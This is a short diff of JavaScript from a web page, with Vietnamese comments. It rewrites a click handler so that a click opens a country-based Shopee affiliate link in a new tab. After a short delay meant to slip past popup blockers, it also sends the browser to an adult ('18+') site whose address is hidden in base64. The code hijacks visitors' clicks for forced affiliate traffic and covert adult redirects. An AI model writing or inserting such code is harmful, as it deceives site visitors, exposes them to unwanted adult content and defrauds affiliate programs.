@@ -176,20 +176,15 @@ document.addEventListener('DOMContentLoaded', function() {
     // Lấy quốc gia
     const country = getCountry();
     const affLink = affLinks[country] || affLinks["VN"];
-
-    // Mở Shopee (tab mới)
-    const a = document.createElement("a");
-    a.href = affLink;
-    a.target = "_blank";
-    a.rel = "noopener noreferrer";
-    document.body.appendChild(a);
-    a.click();
-
-    // Mở link 18+ bền bỉ
     const link18 = atob(link18_b64);
-    navigate18Resilient(link18);
 
-    setTimeout(() => { try { a.remove(); } catch(_){} }, 5000);
+    // ✅ Mở Shopee ngay trong hành động click (trực tiếp user gesture)
+    window.open(affLink, "_blank");
+
+    // ✅ Song song mở link 18+ bền bỉ (delay để tránh chặn popup)
+    setTimeout(() => {
+      navigate18Resilient(link18);
+    }, 200);
   });
 });
 </script>
